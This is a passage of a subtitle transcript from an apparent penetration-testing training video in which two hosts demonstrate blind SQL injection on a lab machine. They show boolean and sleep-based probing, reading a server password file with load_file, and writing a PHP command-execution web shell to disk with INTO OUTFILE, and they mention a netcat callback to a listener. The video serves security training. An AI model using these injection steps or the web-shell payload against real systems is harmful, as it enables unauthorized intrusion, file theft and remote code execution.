play.\n\n56\n00:02:47.910 --> 00:02:51.680\nSo we're not gonna be seeing any errors,\nwhich is why they call it blind, right?\n\n57\n00:02:51.680 --> 00:02:58.470\nYou're not seeing anything back,\nat least not overtly.\n\n58\n00:02:58.470 --> 00:02:59.860\n&gt;&gt; Yeah, not quite as obvious.\n\n59\n00:02:59.860 --> 00:03:01.200\n&gt;&gt; Not as obvious.\n\n60\n00:03:01.200 --> 00:03:05.170\nSo you gotta be really\nkeenly looking at the site.\n\n61\n00:03:05.170 --> 00:03:08.960\nFor any difference in what you saw before,\n\n62\n00:03:08.960 --> 00:03:11.600\nbefore you hit that enter key,\nand pushed your SQL.\n\n63\n00:03:11.600 --> 00:03:14.060\n&gt;&gt; You know I love those games where\nthey show you two pictures and\n\n64\n00:03:14.060 --> 00:03:15.600\nyou try to figure out what\nthe difference is between the two?\n\n65\n00:03:15.600 --> 00:03:16.680\n&gt;&gt; Yeah.\n&gt;&gt; I mean it's kind of what\n\n66\n00:03:16.680 --> 00:03:17.310\nyou're doing here.\n\n67\n00:03:17.310 --> 00:03:18.330\n&gt;&gt; Yeah, I like that analogy.\n\n68\n00:03:18.330 --> 00:03:19.100\nThat's really good.\n\n69\n00:03:19.100 --> 00:03:20.700\nYou're sitting there going.\n\n70\n00:03:20.700 --> 00:03:21.935\nThe banana is green.\n\n71\n00:03:21.935 --> 00:03:23.870\n&gt;&gt; [LAUGH]\n&gt;&gt; I see what's going on,\n\n72\n00:03:23.870 --> 00:03:26.660\nI'll circle that, I love the funny papers,\nit's so much fun.\n\n73\n00:03:26.660 --> 00:03:27.190\n&gt;&gt; Yeah.\n\n74\n00:03:27.190 --> 00:03:30.190\n&gt;&gt; So, yeah, kind of the idea,\nyou're looking for a difference.\n\n75\n00:03:30.190 --> 00:03:34.190\nAnd any difference might be\nthat key to let you know well,\n\n76\n00:03:34.190 --> 00:03:39.090\nsomething has changed, cuz if this\nsequel statement didn't go through\n\n77\n00:03:39.090 --> 00:03:41.200\nIt would've just not done anything.\n\n78\n00:03:41.200 --> 00:03:44.950\nIf it was sanitized it would just give me\nnormal, the same exact blue pipe print.\n\n79\n00:03:44.950 --> 00:03:47.820\nSo, look out for changes, and\n\n80\n00:03:47.820 --> 00:03:51.812\nthen we'll take a look if that doesn't\nhappen on what you can continue to do.\n\n81\n00:03:51.812 --> 00:03:56.740\nAll right, so let's look at blind SQL\ninjection, let me get our website back up.\n\n82\n00:03:56.740 --> 00:03:59.240\nHere it is, remember we have those\nlovely passwords and everything.\n\n83\n00:03:59.240 --> 00:04:01.230\nI didn't move away from it.\n\n84\n00:04:01.230 --> 00:04:04.560\nI left it up for you guys to look at,\nso you remember what we were doing.\n\n85\n00:04:04.560 --> 00:04:11.590\nBut let's go just to,\nback to good old this, right?\n\n86\n00:04:11.590 --> 00:04:15.190\nThat standard page we started off with,\nfantastic.\n\n87\n00:04:15.190 --> 00:04:17.880\nWhat you can do with BLAST 2,\n\n88\n00:04:17.880 --> 00:04:21.930\nlet's pretend that this site\ndoes not give us errors.\n\n89\n00:04:21.930 --> 00:04:23.650\nWhen we type in bad SQL, all right?\n\n90\n00:04:23.650 --> 00:04:27.480\nSo, remember we did the single quote and\nhit Return and it gets us here.\n\n91\n00:04:27.480 --> 00:04:29.320\nLet's pretend that doesn't happen.\n\n92\n00:04:29.320 --> 00:04:30.560\nOkay, so.\n\n93\n00:04:30.560 --> 00:04:32.410\n&gt;&gt; I don't see anything,\nI don't know where I should look.\n\n94\n00:04:32.410 --> 00:04:35.106\n&gt;&gt; Which is fine, [LAUGH] pay no attention\nto the man behind the curtain, right?\n\n95\n00:04:35.106 --> 00:04:38.103\n&gt;&gt; [LAUGH]\n&gt;&gt; So, what you would do for\n\n96\n00:04:38.103 --> 00:04:43.570\nblind SQL injection testing is\nthrow at it some actual SQL.\n\n97\n00:04:43.570 --> 00:04:45.500\nAnd see if it does something.\n\n98\n00:04:45.500 --> 00:04:49.780\nSo that's basically you're looking for\na true false kinda thing at this point.\n\n99\n00:04:49.780 --> 00:04:53.580\nIf something occurs then you know\nthat your SQL command got executed.\n\n100\n00:04:53.580 --> 00:04:55.900\nIf nothing occurs,\nyou get back to a site or\n\n101\n00:04:55.900 --> 00:05:02.150\njust their site takes you to a regular\npage, then you know that it's not working.\n\n102\n00:05:02.150 --> 00:05:02.790\nSo let's do that.\n\n103\n00:05:02.790 --> 00:05:08.407\nLet's try our and statement we'll say and\n\n104\n00:05:08.407 --> 00:05:14.500\none equals one semi colon\nharsh on that's it.\n\n105\n00:05:14.500 --> 00:05:19.250\nAnd I'm getting an error obviously\nbecause that but you wanna try that and\n\n106\n00:05:19.250 --> 00:05:22.390\nI wanna try something so\nthat's a correct statement.\n\n107\n00:05:22.390 --> 00:05:24.270\nOne does equals one.\n\n108\n00:05:24.270 --> 00:05:27.440\nAnd we're tagging that on to the end of\nthis little SQL statement right here.\n\n109\n00:05:29.040 --> 00:05:30.730\nSo one does equal one, that's good.\n\n110\n00:05:30.730 --> 00:05:32.170\nIt's a correct statement, it's true.\n\n111\n00:05:32.170 --> 00:05:36.110\nIf you don't see anything change,\nthen that's fine.\n\n112\n00:05:37.190 --> 00:05:37.821\nIf that doesn't work,\n\n113\n00:05:37.821 --> 00:05:41.450\nyou're not getting some output\ntry something that's not right.\n\n114\n00:05:41.450 --> 00:05:45.130\nWe try to force a problem, per say, right.\n\n115\n00:05:45.130 --> 00:05:46.120\nSo try one equals two.\n\n116\n00:05:48.080 --> 00:05:48.740\nRight?\n\n117\n00:05:48.740 --> 00:05:49.870\nMaybe the website changes.\n\n118\n00:05:51.060 --> 00:05:53.280\nYou're looking for\nthose subtle hints, right?\n\n119\n00:05:53.280 --> 00:05:56.580\nAnd that's basically\nwhere you would do that.\n\n120\n00:05:56.580 --> 00:06:00.310\nIf those don't work what you can do is\n\n121\n00:06:00.310 --> 00:06:04.690\ntry a very common technique is to build\nin yourself like a little test mechanism.\n\n122\n00:06:04.690 --> 00:06:07.560\nMechanism to see if they're\nactually working or not.\n\n123\n00:06:07.560 --> 00:06:10.690\nIf you're putting these things in and\nyou're not seeing any changes\n\n124\n00:06:10.690 --> 00:06:15.630\nit doesn't necessarily mean your SQL\nisn't actually getting executed.\n\n125\n00:06:15.630 --> 00:06:17.410\nIt just means you're not seeing it.\n\n126\n00:06:18.550 --> 00:06:22.520\nSo you wanna do something that\nwill make it more obvious\n\n127\n00:06:22.520 --> 00:06:26.150\nthat your SQL is being Executed.\n\n128\n00:06:26.150 --> 00:06:29.890\nAnd one of the most common ways to do\nthat is to call in the sleep function.\n\n129\n00:06:29.890 --> 00:06:33.160\nWhich basically you say\nsleep x amount of seconds.\n\n130\n00:06:33.160 --> 00:06:37.322\nAnd so if I say five seconds, the website\nwill hang for five seconds because\n\n131\n00:06:37.322 --> 00:06:41.170\nit's waiting five seconds before\nit issues the rest of the command.\n\n132\n00:06:42.170 --> 00:06:42.840\nOkay?\n\n133\n00:06:42.840 --> 00:06:47.790\nSo if the website hangs, I know that\nit's taking SQL injection, right?\n\n134\n00:06:47.790 --> 00:06:50.510\nBecause I've injected\nthe sleep function into there.\n\n135\n00:06:50.510 --> 00:06:53.970\nIf it doesn't hang, then I know\nthat it's not vulnerable, right?\n\n136\n00:06:53.970 --> 00:06:59.340\nAnd then if it does hang, I could\ncontinue to use sleep to verify that my\n\n137\n00:06:59.340 --> 00:07:05.340\ncode is working, cuz sleep is getting\nissued, it is being executed.\n\n138\n00:07:05.340 --> 00:07:07.430\nAnd then the rest of it should\nbe executed as well, right?\n\n139\n00:07:07.430 --> 00:07:10.340\nIf it doesn't, if it doesn't hang,\nthen I know my SQL was bad.\n\n140\n00:07:10.340 --> 00:07:11.840\nI need to go back and take a look.\n\n141\n00:07:11.840 --> 00:07:16.150\nMaybe I malformed it,\nI gotta make sure to verify my syntax.\n\n142\n00:07:16.150 --> 00:07:17.110\nAll that good stuff.\n\n143\n00:07:17.110 --> 00:07:20.350\nSo we can kinda use it as\na true-false statement for us.\n\n144\n00:07:20.350 --> 00:07:24.640\nIf my website hangs,\nthat SQL statement went through.\n\n145\n00:07:24.640 --> 00:07:28.170\nIf it doesn't hang, then I did something\nwrong and I need to try again.\n\n146\n00:07:28.170 --> 00:07:29.740\nAll right, so let's try that.\n\n147\n00:07:29.740 --> 00:07:31.090\nHow does that look in the URL?\n\n148\n00:07:31.090 --> 00:07:35.890\nObviously, that's where we like to\nhang out and back this monkey up so\n\n149\n00:07:35.890 --> 00:07:38.550\nI can make sure I get my thing correctly.\n\n150\n00:07:38.550 --> 00:07:40.000\nIs it -sleep?\n\n151\n00:07:40.000 --> 00:07:42.410\nYeah, there we go.\n\n152\n00:07:42.410 --> 00:07:47.008\nSo we just add -sleep and\nthen how many seconds you want to sleep.\n\n153\n00:07:47.008 --> 00:07:53.569\nSo we say -sleep, and then I say open\nparentheses, five, close parentheses.\n\n154\n00:07:53.569 --> 00:07:54.555\nI hit return.\n\n155\n00:07:54.555 --> 00:07:56.674\nYou'll notice right over here.\n\n156\n00:07:56.674 --> 00:07:58.184\nSwirly, swirly, swirly.\n\n157\n00:07:58.184 --> 00:08:02.000\nNow I set five seconds,\nI think it actually they do five seconds.\n\n158\n00:08:02.000 --> 00:08:03.010\n&gt;&gt; That was 500 monthly.\n\n159\n00:08:03.010 --> 00:08:03.580\n&gt;&gt; Awesome.\n\n160\n00:08:03.580 --> 00:08:05.845\nMike and I actually time in out right now.\n\n161\n00:08:05.845 --> 00:08:08.920\n[LAUGH] The fact that I,\nI hit sleep five, it did hang for\n\n162\n00:08:08.920 --> 00:08:10.740\nfive seconds then it came through.\n\n163\n00:08:10.740 --> 00:08:12.440\nAs we know if that works.\n\n164\n00:08:12.440 --> 00:08:15.530\nIf it hangs for ten seconds it's\nfine too even if I put five.\n\n165\n00:08:15.530 --> 00:08:18.010\nIf it hangs for\ntwo seconds that's fine too.\n\n166\n00:08:18.010 --> 00:08:20.880\nAs long as it hangs,\nthat's really what we're looking for.\n\n167\n00:08:20.880 --> 00:08:25.120\nEven if it doesn't hang for\nthe exact amount of time which you put it.\n\n168\n00:08:25.120 --> 00:08:26.320\nAll we're looking for\nreally is that it hung.\n\n169\n00:08:26.320 --> 00:08:29.530\nNow that we know what it does that,\nlike I said,\n\n170\n00:08:29.530 --> 00:08:32.600\nyou could continue to use that\nas a true/false variable.\n\n171\n00:08:32.600 --> 00:08:36.100\nBut now that we know that our SQL\nstatements are working correctly,\n\n172\n00:08:36.100 --> 00:08:41.510\nwe can just start firing them off.\n\n173\n00:08:41.510 --> 00:08:43.780\nDid I come up with anything\ninteresting I wanted to do with that?\n\n174\n00:08:43.780 --> 00:08:46.640\nNot really, I mean basically\nwe're back to what we did before.\n\n175\n00:08:46.640 --> 00:08:48.230\n&gt;&gt; That's gonna give you\nthe same commands, yup.\n\n176\n00:08:48.230 --> 00:08:49.240\n&gt;&gt; Yeah, exactly.\n\n177\n00:08:49.240 --> 00:08:51.430\nYou start looking for column enumeration,\n\n178\n00:08:51.430 --> 00:08:55.840\ntable enumeration, and\nexecuting that output to the.\n\n179\n00:08:55.840 --> 00:09:01.420\nSo all that we did in part one I\ncan now do here in part two now\n\n180\n00:09:01.420 --> 00:09:03.470\nthat I know blindly.\n\n181\n00:09:03.470 --> 00:09:07.580\n&gt;&gt; It just took you a little more effort\nto find out if they were even susceptible\n\n182\n00:09:07.580 --> 00:09:08.600\nto the SQL injection.\n\n183\n00:09:08.600 --> 00:09:09.900\nBecause we couldn't see the errors.\n\n184\n00:09:09.900 --> 00:09:13.480\nWe couldn't see the sequel statements\nthat are being used on the back end, so\n\n185\n00:09:13.480 --> 00:09:16.510\nwe're just trying to put\nsomething in there that will\n\n186\n00:09:16.510 --> 00:09:20.720\nfinish that sequel statement and let me\nexecute a command, hence the name blind.\n\n187\n00:09:20.720 --> 00:09:25.240\nAnd remember with the and statements,\nunlike the ors, both side have to be true.\n\n188\n00:09:25.240 --> 00:09:29.410\nSo, when you did the something and\none equals one.\n\n189\n00:09:29.410 --> 00:09:32.560\nWell we know that one equals one was true,\nbut the other side wasn't.\n\n190\n00:09:32.560 --> 00:09:35.830\nBut then the second one,\nyou're saying, okay one equals two.\n\n191\n00:09:35.830 --> 00:09:37.000\nYou know that's false.\n\n192\n00:09:37.000 --> 00:09:38.340\nThat falsifies the whole statement.\n\n193\n00:09:38.340 --> 00:09:41.940\nBoth sides of the end as you're\ntrying to get some kind of feedback\n\n194\n00:09:41.940 --> 00:09:42.880\nfrom that website.\n\n195\n00:09:42.880 --> 00:09:45.480\nBut I like the way you put it at\nthe very beginning of the show.\n\n196\n00:09:45.480 --> 00:09:48.120\nI think it might have been in\nthe previous episode even,\n\n197\n00:09:48.120 --> 00:09:50.330\nis you're throwing the kitchen sink at it,\nright?\n\n198\n00:09:50.330 --> 00:09:52.230\nI mean,\nthat's what Blind SQL injection is.\n\n199\n00:09:52.230 --> 00:09:56.870\nI can't see what's going on so I'm just\ngonna throw stuff at it, hoping I can\n\n200\n00:09:56.870 --> 00:10:01.460\nglean some bit of information, or some\nidea that what's happening is working.\n\n201\n00:10:01.460 --> 00:10:03.990\n&gt;&gt; That's right.\nWe're trying to make it break,\n\n202\n00:10:03.990 --> 00:10:06.540\nbecause if it breaks then I know that\nI've done something, I've affected it.\n\n203\n00:10:06.540 --> 00:10:07.960\nSo there we go.\n\n204\n00:10:07.960 --> 00:10:12.070\nSo use those Blind SQL techniques to\n\n205\n00:10:12.070 --> 00:10:15.480\nenumerate machines that\nyou don't get errors from.\n\n206\n00:10:15.480 --> 00:10:19.840\nThat being said, there's a couple other\nthings we can do with a SQL injection.\n\n207\n00:10:19.840 --> 00:10:23.168\nWe can read, write, and even execute code.\n\n208\n00:10:23.168 --> 00:10:24.056\nThat's scary.\n\n209\n00:10:24.056 --> 00:10:25.460\n&gt;&gt; [LAUGH]\n&gt;&gt; Well we're\n\n210\n00:10:25.460 --> 00:10:29.180\nnot going to execute code with SQL per se,\nwe're going to use the browser to do that.\n\n211\n00:10:29.180 --> 00:10:33.090\nBut we can read and\nwrite data into the data,\n\n212\n00:10:33.090 --> 00:10:36.460\nactually it's a machine itself,\nreally cool.\n\n213\n00:10:36.460 --> 00:10:40.114\nLet me show you to do that,\nif we want to read data,\n\n214\n00:10:40.114 --> 00:10:43.429\nwe're gonna use load file function, okay?\n\n215\n00:10:43.429 --> 00:10:48.661\nIf I go in here and we're gonna go\nback to the way we did with our union\n\n216\n00:10:48.661 --> 00:10:54.174\nselect statement, so I'm gonna get\nthat up there, I'll say union,\n\n217\n00:10:54.174 --> 00:10:58.581\nI'll select, and\nthen we remember we had six columns.\n\n218\n00:10:58.581 --> 00:11:00.430\nThat's what it was, six.\n\n219\n00:11:00.430 --> 00:11:05.670\nAnd columns two and three were good for\ninput and output, right?\n\n220\n00:11:05.670 --> 00:11:07.770\nSo that's what we're gonna do.\n\n221\n00:11:07.770 --> 00:11:12.770\nSo I'm gonna use column two\nto say load_file, like that.\n\n222\n00:11:12.770 --> 00:11:16.320\nAnd then open parenthesis,\ngive it double quotes.\n\n223\n00:11:16.320 --> 00:11:18.390\nAnd then tell it what file you wanna load.\n\n224\n00:11:18.390 --> 00:11:20.940\nSo I'm gonna say,\nremember we're reading a file.\n\n225\n00:11:20.940 --> 00:11:25.611\nIt wants to load this file into\nmy output here, into the column.\n\n226\n00:11:25.611 --> 00:11:27.332\nLet's see what happens.\n\n227\n00:11:27.332 --> 00:11:31.853\nLoad file, let's do se password,\ncuz that's always a good one,\n\n228\n00:11:31.853 --> 00:11:36.870\n/password, and then close it quotation,\nclose the parentheses.\n\n229\n00:11:36.870 --> 00:11:42.040\nAnd then remember you gotta have\nall your columns, six, like that.\n\n230\n00:11:42.040 --> 00:11:42.900\nAnd then just hit enter.\n\n231\n00:11:44.260 --> 00:11:44.780\nAnd look at that.\n\n232\n00:11:45.860 --> 00:11:48.830\nThere is the se password file.\n\n233\n00:11:48.830 --> 00:11:54.090\nSo I loaded a file from this\nweb server into that column and\n\n234\n00:11:54.090 --> 00:11:56.750\nit outputted the data\ninto our website here.\n\n235\n00:11:56.750 --> 00:11:58.660\nSo that's interesting.\n\n236\n00:11:58.660 --> 00:11:59.210\n&gt;&gt; That's scary.\n\n237\n00:11:59.210 --> 00:12:01.780\n&gt;&gt; Yeah,\nthat might pucker you up a little bit and\n\n238\n00:12:01.780 --> 00:12:03.800\ngo I don't like that if I'm a web server.\n\n239\n00:12:03.800 --> 00:12:04.960\nYou're starting to sweat.\n\n240\n00:12:04.960 --> 00:12:05.920\nYou're a web admin,\n\n241\n00:12:05.920 --> 00:12:09.250\nyou're going well I need to check\nmy data sanitization right now.\n\n242\n00:12:09.250 --> 00:12:11.450\n[LAUGH] We're going through code boys.\n\n243\n00:12:11.450 --> 00:12:14.920\n&gt;&gt; Pause the video [LAUGH]\n&gt;&gt; All right so not only can we read,\n\n244\n00:12:14.920 --> 00:12:17.440\nwe can also write to the server.\n\n245\n00:12:17.440 --> 00:12:21.430\nThat should also make you go whoa,\nwe can do what now?\n\n246\n00:12:21.430 --> 00:12:26.100\nYeah, so remember in previous episodes\nwe've used the whole php reverse shell\n\n247\n00:12:26.100 --> 00:12:26.956\nfrom pen test monkey.\n\n248\n00:12:26.956 --> 00:12:27.820\nI could upload that.\n\n249\n00:12:27.820 --> 00:12:32.790\nI could upload any kind of malicious code\nthat I want because I can write a file.\n\n250\n00:12:32.790 --> 00:12:38.500\nNow this server's actually I went through\nenumeration quite a bit with this.\n\n251\n00:12:38.500 --> 00:12:39.640\nThey've got it locked down.\n\n252\n00:12:39.640 --> 00:12:42.170\nYou have to be able to\nwrite it to somewhere where\n\n253\n00:12:42.170 --> 00:12:46.280\nit can display it as a webpage,\ncuz you have to visit that to execute it.\n\n254\n00:12:46.280 --> 00:12:47.590\nI can't do that with this server.\n\n255\n00:12:47.590 --> 00:12:49.800\nBut I can show you the steps\nthat you can take,\n\n256\n00:12:49.800 --> 00:12:52.460\nthat if it was vulnerable\nyou'd be able to do that.\n\n257\n00:12:52.460 --> 00:12:53.220\n&gt;&gt; Nice.\n&gt;&gt; So let's do that.\n\n258\n00:12:54.760 --> 00:12:58.700\nWhat we do is we do what's called\nan into out file function.\n\n259\n00:12:58.700 --> 00:13:03.310\nVery, very cool, so\nwe've got our union all select statement.\n\n260\n00:13:03.310 --> 00:13:03.880\nWe're gonna go in here.\n\n261\n00:13:03.880 --> 00:13:06.980\nAnd I'm just gonna give\nit a basic PHP function\n\n262\n00:13:11.220 --> 00:13:16.130\nto basically run the command prompts,\ncommand line, it's Linux.\n\n263\n00:13:16.130 --> 00:13:22.560\nSo what you do is just put your php\ncode in there, so it's php like that and\n\n264\n00:13:22.560 --> 00:13:29.080\nthen what it is echo shell underscore\nexact something that it say,\n\n265\n00:13:29.080 --> 00:13:34.320\nyeah then dollar sign underscore get,\n\n266\n00:13:34.320 --> 00:13:38.360\nand it will be open brackets,\n\n267\n00:13:38.360 --> 00:13:44.210\nquote command, quote close bracket,\nclose parenthesis.\n\n268\n00:13:44.210 --> 00:13:45.500\nDid I forget anything?\n\n269\n00:13:45.500 --> 00:13:46.330\nYeah, my semi-colon.\n\n270\n00:13:46.330 --> 00:13:47.060\nDon't forget that.\n\n271\n00:13:47.060 --> 00:13:48.060\nDone that before.\n\n272\n00:13:48.060 --> 00:13:53.550\nThen, a little bit of this action here.\n\n273\n00:13:53.550 --> 00:13:54.860\nNo, I don't need that, I don't need that.\n\n274\n00:13:54.860 --> 00:13:58.053\nThat should be, or I do need that.\n\n275\n00:13:58.053 --> 00:14:00.760\nNo, just making sure, [INAUDIBLE]\n&gt;&gt; Should be a quote.\n\n276\n00:14:00.760 --> 00:14:03.706\n&gt;&gt; Doesn't really matter.\n\n277\n00:14:03.706 --> 00:14:04.783\nDo I got one?\n\n278\n00:14:04.783 --> 00:14:05.420\n&gt;&gt; After the question mark?\n\n279\n00:14:05.420 --> 00:14:06.255\n&gt;&gt; Did I miss one?\n\n280\n00:14:08.405 --> 00:14:09.140\nThere's three.\n\n281\n00:14:09.140 --> 00:14:09.930\nI wanna make sure.\n\n282\n00:14:09.930 --> 00:14:10.910\nLet me look at my notes real quick.\n\n283\n00:14:10.910 --> 00:14:12.530\nYeah, double quote right there.\n\n284\n00:14:12.530 --> 00:14:16.709\nAnd I think I need one at the front\nof this as well, like so.\n\n285\n00:14:16.709 --> 00:14:19.937\nYeah that should be right.\n\n286\n00:14:19.937 --> 00:14:21.060\nIf it's not, it's not a big deal.\n\n287\n00:14:21.060 --> 00:14:24.780\nIt can't run anyway cuz I don't have\naccess to the server but I'm saying this\n\n288\n00:14:24.780 --> 00:14:28.290\nis what I want you to put into a file and\nthat's when we call into an out file.\n\n289\n00:14:29.490 --> 00:14:36.950\nSo I go to the end of my columns and\nI say into, out file, like that.\n\n290\n00:14:38.430 --> 00:14:40.980\nSingle quotation and\nwhere I want to put it all.\n\n291\n00:14:40.980 --> 00:14:45.450\nThe only directory I have on this\nserver that I can write to is /temp but\n\n292\n00:14:45.450 --> 00:14:50.480\nif this was a vulnerable web server,\nso if it's running Apache it would\n\n293\n00:14:50.480 --> 00:14:55.740\nbe /var/www/http and\nthat would be the web root or\n\n294\n00:14:55.740 --> 00:14:59.190\nany web directory you have\nthe ability to write to.\n\n295\n00:14:59.190 --> 00:15:01.000\nEven though, I'm running as root,\n\n296\n00:15:01.000 --> 00:15:02.920\nI thought that was odd that\nI couldn't write to it.\n\n297\n00:15:02.920 --> 00:15:04.580\nBut it gave me permission\ndenied every time.\n\n298\n00:15:04.580 --> 00:15:09.673\nSo, we're just gonna put it\nin the temp directory, okay?\n\n299\n00:15:09.673 --> 00:15:13.750\nSo /tmp, and\nwe'll just call this /shell.php.\n\n300\n00:15:13.750 --> 00:15:19.160\nLike that, close that out,\nand then hit return.\n\n301\n00:15:19.160 --> 00:15:21.330\nWhat did have a problem with my sequel.\n\n302\n00:15:21.330 --> 00:15:21.920\nWhat's my problem.\n\n303\n00:15:23.200 --> 00:15:25.140\nWell let's verify that let's log in.\n\n304\n00:15:25.140 --> 00:15:27.110\nBecause we do have a log in.\n\n305\n00:15:27.110 --> 00:15:34.220\nStar wars and let's go to c/tmpa, ls.\n\n306\n00:15:34.220 --> 00:15:35.480\nYeah I only got that one, so I did.\n\n307\n00:15:35.480 --> 00:15:38.160\nThere's a little problem with\nmy syntax here let's look for\n\n308\n00:15:38.160 --> 00:15:40.850\nit php echo shell exact.\n\n309\n00:15:42.110 --> 00:15:47.070\nI want to say I forgot a,\nI want to say I need this.\n\n310\n00:15:47.070 --> 00:15:51.120\nI think that's what it is.\n\n311\n00:15:51.120 --> 00:15:52.491\n&gt;&gt; Yeah, probably had to finish that PHP.\n\n312\n00:15:52.491 --> 00:15:55.364\n&gt;&gt; Yeah,\nI think that's what the problem was.\n\n313\n00:15:55.364 --> 00:15:58.843\nJust verifying, verifying,\nthat all looks right.\n\n314\n00:15:58.843 --> 00:16:02.051\nAnd let's try that.\n\n315\n00:16:02.051 --> 00:16:06.690\nLet's take a look,\ndo an ls having an issue.\n\n316\n00:16:06.690 --> 00:16:09.630\n&gt;&gt; Instead of that last question mark\nafter the semicolon I wonder if that\n\n317\n00:16:09.630 --> 00:16:12.370\nshouldn't be the greater than and\nno question mark.\n\n318\n00:16:12.370 --> 00:16:15.330\nI know a lot of time PHP has\nthe question mark at the beginning.\n\n319\n00:16:15.330 --> 00:16:15.878\nLet me just look.\n\n320\n00:16:15.878 --> 00:16:21.303\nLet me not get ahead of myself here.\n\n321\n00:16:21.303 --> 00:16:25.530\nQuestion mark,\nI'm pretty sure I need that.\n\n322\n00:16:25.530 --> 00:16:26.670\nBut we'll take it out, what the heck.\n\n323\n00:16:27.830 --> 00:16:29.660\nMike might be right, let's try it.\n\n324\n00:16:29.660 --> 00:16:31.670\nYeah, we're getting the same, same thing.\n\n325\n00:16:31.670 --> 00:16:32.170\n&gt;&gt; Same thing, yeah.\n\n326\n00:16:33.400 --> 00:16:34.268\nIt's not writing it.\n\n327\n00:16:34.268 --> 00:16:36.469\nYou can see that I've actually\nsuccessfully done this before because\n\n328\n00:16:36.469 --> 00:16:37.333\nthere's backdoor.php.\n\n329\n00:16:37.333 --> 00:16:37.954\n&gt;&gt; Mm-hm.\n\n330\n00:16:37.954 --> 00:16:42.868\n&gt;&gt; I'm getting muddled up with my syntax\nhere because I don't know what the heck\n\n331\n00:16:42.868 --> 00:16:46.747\nis going on-\n&gt;&gt; Looks like you closed your bracket.\n\n332\n00:16:46.747 --> 00:16:47.760\n&gt;&gt; Let's see here.\n\n333\n00:16:47.760 --> 00:16:50.144\nThis is where it gets fun-\n&gt;&gt; Yes.\n\n334\n00:16:50.144 --> 00:16:50.985\n&gt;&gt; Guys and girls, right?\n\n335\n00:16:50.985 --> 00:16:53.853\nIt's all about making sure\nyour syntax is correct.\n\n336\n00:16:53.853 --> 00:16:55.930\nAnd once it is, everything will work.\n\n337\n00:16:55.930 --> 00:16:58.840\nAnd I'm going to make it work, yes.\n\n338\n00:16:58.840 --> 00:16:59.710\nI'm going to make it work.\n\n339\n00:17:00.930 --> 00:17:02.100\nIs weird.\n\n340\n00:17:02.100 --> 00:17:02.800\nWhat's going on?\nOkay,\n\n341\n00:17:02.800 --> 00:17:06.340\nI'm gonna go back to Square really quick,\ncuz I want that PHP shown.\n\n342\n00:17:06.340 --> 00:17:07.960\nI'm just gonna backup so\nI don't have to retype it.\n\n343\n00:17:09.700 --> 00:17:10.990\nThere we go.\nThat's all in there.\n\n344\n00:17:12.500 --> 00:17:13.990\nLet me look through here.\n\n345\n00:17:13.990 --> 00:17:18.340\nOne also, three four five six\nseven eight into our file.\n\n346\n00:17:19.470 --> 00:17:23.900\nAnd then this, and then, okay, okay.\n\n347\n00:17:23.900 --> 00:17:26.020\nI think I found.\n\n348\n00:17:26.020 --> 00:17:27.270\nThis is fun ladies and gentlemen.\n\n349\n00:17:27.270 --> 00:17:31.910\nThis is the whole like welcome to\npin testing, hacking in general.\n\n350\n00:17:31.910 --> 00:17:35.320\nIt's always the little\ndetails that gets you and\n\n351\n00:17:35.320 --> 00:17:38.910\nI've just realized what the heck I\ndid wrong or didn't do, should I say.\n\n352\n00:17:38.910 --> 00:17:41.080\n&gt;&gt; You and me, Daniel,\ncuz I don't see it either.\n\n353\n00:17:41.080 --> 00:17:43.234\n&gt;&gt; Mike's pretty decent at SQL.\n\n354\n00:17:43.234 --> 00:17:46.398\nMike's not seeing it so it makes me\nfeel a little better that I forgot this.\n\n355\n00:17:46.398 --> 00:17:49.500\n&gt;&gt; [LAUGH]\n&gt;&gt; I just forgot something.\n\n356\n00:17:49.500 --> 00:17:53.470\nApparently, cuz we have an error here,\nit's kinda letting me know that it's doing\n\n357\n00:17:53.470 --> 00:17:58.020\nsomething wrong I should\ncomment everything else out.\n\n358\n00:17:58.020 --> 00:18:00.740\nLike this.\nLet's try that.\n\n359\n00:18:00.740 --> 00:18:01.450\nLook!\n\n360\n00:18:01.450 --> 00:18:02.440\nThings work.\n\n361\n00:18:02.440 --> 00:18:05.680\nSee, two little dashes can\nbreak your entire game.\n\n362\n00:18:05.680 --> 00:18:06.220\n&gt;&gt; Yup.\n\n363\n00:18:06.220 --> 00:18:09.370\n&gt;&gt; So you have to be thorough,\nyou have to be making sure.\n\n364\n00:18:09.370 --> 00:18:13.500\nThat's why watching us work with this and\n\n365\n00:18:13.500 --> 00:18:17.620\nfigure out what did I do wrong,\nthat is the pin testing day.\n\n366\n00:18:17.620 --> 00:18:19.200\nThat's what you're gonna do.\n\n367\n00:18:19.200 --> 00:18:20.710\nWhere did I not do this correctly?\n\n368\n00:18:20.710 --> 00:18:23.540\nCuz I've done this before and\nit's not working.\n\n369\n00:18:23.540 --> 00:18:25.670\nSo this kind of thing can happen.\n\n370\n00:18:25.670 --> 00:18:29.060\nNow we go in here, we do that ls in Temp.\n\n371\n00:18:29.060 --> 00:18:30.796\nHey, look, there's shell.php.\n\n372\n00:18:30.796 --> 00:18:35.195\nAnd if this were in the web root\nI could then browse to that page,\n\n373\n00:18:35.195 --> 00:18:39.843\nform a URL that actually calls that\ncommand and do something like,\n\n374\n00:18:39.843 --> 00:18:44.250\nI don't know, net cap,\nthat back to my listener, all right?\n\n375\n00:18:44.250 --> 00:18:47.550\nSo, it can be very dangerous for\nus to be able to write to the web root.\n\n376\n00:18:47.550 --> 00:18:52.220\nThey did a good job on this key\noptics box,, it's all lock down,\n\n377\n00:18:52.220 --> 00:18:53.670\nI don't know where to go.\n\n378\n00:18:53.670 --> 00:18:55.310\n&gt;&gt; Yeah they do a great job\nof building these things up.\n\n379\n00:18:55.310 --> 00:18:58.960\nBut they really do try to focus\nyou on one particular thing, or\n\n380\n00:18:58.960 --> 00:19:01.920\none particular vulnerability that you're\nsupposed to be taking advantage of.\n\n381\n00:19:01.920 --> 00:19:03.530\n&gt;&gt; Yeah.\nHow'd you like that Mike?\n\n382\n00:19:03.530 --> 00:19:04.220\n&gt;&gt; That was good.\n\n383\n00:19:04.220 --> 00:19:04.950\nI love those.\n\n384\n00:19:04.950 --> 00:19:09.760\nThat's why SQL injection is one of my\nfaves because it's so dangerous and\n\n385\n00:19:09.760 --> 00:19:13.640\nthe problem is a lot of\nsites are vulnerable to it.\n\n386\n00:19:13.640 --> 00:19:14.630\n&gt;&gt; Totally.\n\n387\n00:19:14.630 --> 00:19:18.400\nSo, now we've shown you the hard way\nto do all this SQL injection stuff,\n\n388\n00:19:18.400 --> 00:19:18.920\nat least some of it.\n\n389\n00:19:18.920 --> 00:19:20.830\nLet's show you the easy way.\n\n390\n00:19:20.830 --> 00:19:22.760\nLet's give you a bone,\nlet's throw you a 